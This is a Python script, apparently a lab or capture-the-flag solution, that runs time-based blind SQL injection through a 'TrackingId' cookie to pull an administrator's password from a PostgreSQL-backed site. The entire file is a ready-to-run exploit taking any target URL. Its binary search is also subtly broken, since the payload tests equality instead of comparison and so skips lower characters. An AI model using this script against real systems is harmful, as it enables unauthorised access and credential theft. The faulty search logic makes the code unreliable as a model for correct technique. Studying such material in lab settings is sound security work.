import sys
import requests
import urllib
import urllib3
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def sqli_password(url):
    password_extracted = ""
    
    # We'll check one character at a time using binary search
    for i in range(1, 21):  # Assuming password length is 20
        low, high = 32, 126  # ASCII range for printable characters
        found_char = False

        while low <= high:
            mid = (low + high) // 2
            # Refined SQL payload format using binary search logic
            sqli_payload = "' || (SELECT CASE WHEN (username='administrator' AND ascii(substr(password, %s, 1))='%s') THEN pg_sleep(10) ELSE pg_sleep(-1) END)--" % (i, mid)
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            
            cookies = {
                'TrackingId': 'Sebt4shuw5Sa0Uyd' + sqli_payload_encoded,
                'session': 'BmUBn0VuC24iHBcHLamzyml1IPll7aO7'
            }
            
            print(f"[*] Trying position {i}, ASCII: {mid} (Character: {chr(mid)})")
            print(f"[*] Payload: {sqli_payload}")  # Print the payload for better visibility

            try:
                start_time = time.time()
                r = requests.get(url, cookies=cookies, verify=False, timeout=120)
                end_time = time.time()
                
                elapsed_time = end_time - start_time
                print(f"[*] Elapsed time: {elapsed_time} seconds")
                
                if elapsed_time > 9:  # True condition detected (10-second delay)
                    password_extracted += chr(mid)
                    sys.stdout.write(f'\rPassword so far: {password_extracted}\n')
                    sys.stdout.flush()
                    found_char = True
                    break  # Exit the loop for the current character

                else:
                    # Adjusting binary search range
                    if elapsed_time < 9:
                        low = mid + 1  # Character is greater than mid
                    else:
                        high = mid - 1  # Character is less than mid

            except requests.Timeout:
                print(f"\n(-) Timeout occurred at position {i}. Retrying...")

        if not found_char:
            print(f"\n(-) No character found for position {i}. Password length so far: {len(password_extracted)}")
            break  # Exit if no character was found

    print("\n(+) Password extraction complete. Final password: %s" % password_extracted)

def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage: {sys.argv[0]} <url>")
        print(f"(+) Example: {sys.argv[0]} www.example.com")
        sys.exit(1)
        
    url = sys.argv[1]
    print("(+) Retrieving admin password...")
    sqli_password(url)

if __name__ == "__main__":
    main()
